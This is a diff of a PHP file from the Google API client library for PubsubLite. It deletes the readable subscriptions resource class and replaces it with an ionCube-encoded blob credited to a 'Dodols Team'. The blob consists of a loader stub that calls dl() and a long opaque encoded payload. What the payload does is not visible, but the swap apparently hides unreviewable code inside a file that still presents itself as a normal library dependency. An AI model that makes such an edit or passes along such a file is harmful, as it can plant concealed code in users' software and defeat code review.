@@ -1,129 +1,70 @@
-<?php
-/*
- * Copyright 2014 Google Inc.
- *
- * Licensed under the Apache License, Version 2.0 (the "License"); you may not
- * use this file except in compliance with the License. You may obtain a copy of
- * the License at
- *
- * http://www.apache.org/licenses/LICENSE-2.0
- *
- * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
- * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
- * License for the specific language governing permissions and limitations under
- * the License.
- */
-
-namespace Google\Service\PubsubLite\Resource;
-
-use Google\Service\PubsubLite\ListSubscriptionsResponse;
-use Google\Service\PubsubLite\PubsubliteEmpty;
-use Google\Service\PubsubLite\Subscription;
-
-/**
- * The "subscriptions" collection of methods.
- * Typical usage is:
- *  <code>
- *   $pubsubliteService = new Google\Service\PubsubLite(...);
- *   $subscriptions = $pubsubliteService->subscriptions;
- *  </code>
- */
-class AdminProjectsLocationsSubscriptions extends \Google\Service\Resource
-{
-  /**
-   * Creates a new subscription. (subscriptions.create)
-   *
-   * @param string $parent Required. The parent location in which to create the
-   * subscription. Structured like
-   * `projects/{project_number}/locations/{location}`.
-   * @param Subscription $postBody
-   * @param array $optParams Optional parameters.
-   *
-   * @opt_param bool skipBacklog If true, the newly created subscription will only
-   * receive messages published after the subscription was created. Otherwise, the
-   * entire message backlog will be received on the subscription. Defaults to
-   * false.
-   * @opt_param string subscriptionId Required. The ID to use for the
-   * subscription, which will become the final component of the subscription's
-   * name. This value is structured like: `my-sub-name`.
-   * @return Subscription
-   */
-  public function create($parent, Subscription $postBody, $optParams = [])
-  {
-    $params = ['parent' => $parent, 'postBody' => $postBody];
-    $params = array_merge($params, $optParams);
-    return $this->call('create', [$params], Subscription::class);
-  }
-  /**
-   * Deletes the specified subscription. (subscriptions.delete)
-   *
-   * @param string $name Required. The name of the subscription to delete.
-   * @param array $optParams Optional parameters.
-   * @return PubsubliteEmpty
-   */
-  public function delete($name, $optParams = [])
-  {
-    $params = ['name' => $name];
-    $params = array_merge($params, $optParams);
-    return $this->call('delete', [$params], PubsubliteEmpty::class);
-  }
-  /**
-   * Returns the subscription configuration. (subscriptions.get)
-   *
-   * @param string $name Required. The name of the subscription whose
-   * configuration to return.
-   * @param array $optParams Optional parameters.
-   * @return Subscription
-   */
-  public function get($name, $optParams = [])
-  {
-    $params = ['name' => $name];
-    $params = array_merge($params, $optParams);
-    return $this->call('get', [$params], Subscription::class);
-  }
-  /**
-   * Returns the list of subscriptions for the given project.
-   * (subscriptions.listAdminProjectsLocationsSubscriptions)
-   *
-   * @param string $parent Required. The parent whose subscriptions are to be
-   * listed. Structured like `projects/{project_number}/locations/{location}`.
-   * @param array $optParams Optional parameters.
-   *
-   * @opt_param int pageSize The maximum number of subscriptions to return. The
-   * service may return fewer than this value. If unset or zero, all subscriptions
-   * for the parent will be returned.
-   * @opt_param string pageToken A page token, received from a previous
-   * `ListSubscriptions` call. Provide this to retrieve the subsequent page. When
-   * paginating, all other parameters provided to `ListSubscriptions` must match
-   * the call that provided the page token.
-   * @return ListSubscriptionsResponse
-   */
-  public function listAdminProjectsLocationsSubscriptions($parent, $optParams = [])
-  {
-    $params = ['parent' => $parent];
-    $params = array_merge($params, $optParams);
-    return $this->call('list', [$params], ListSubscriptionsResponse::class);
-  }
-  /**
-   * Updates properties of the specified subscription. (subscriptions.patch)
-   *
-   * @param string $name The name of the subscription. Structured like: projects/{
-   * project_number}/locations/{location}/subscriptions/{subscription_id}
-   * @param Subscription $postBody
-   * @param array $optParams Optional parameters.
-   *
-   * @opt_param string updateMask Required. A mask specifying the subscription
-   * fields to change.
-   * @return Subscription
-   */
-  public function patch($name, Subscription $postBody, $optParams = [])
-  {
-    $params = ['name' => $name, 'postBody' => $postBody];
-    $params = array_merge($params, $optParams);
-    return $this->call('patch', [$params], Subscription::class);
-  }
-}
-
-// Adding a class alias for backwards compatibility with the previous class name.
-class_alias(AdminProjectsLocationsSubscriptions::class, 'Google_Service_PubsubLite_Resource_AdminProjectsLocationsSubscriptions');
+<?php //00551
+// --------------------------
+// Created by Dodols Team
+// --------------------------
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
+?>
+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
+XKcbQeUyEW==
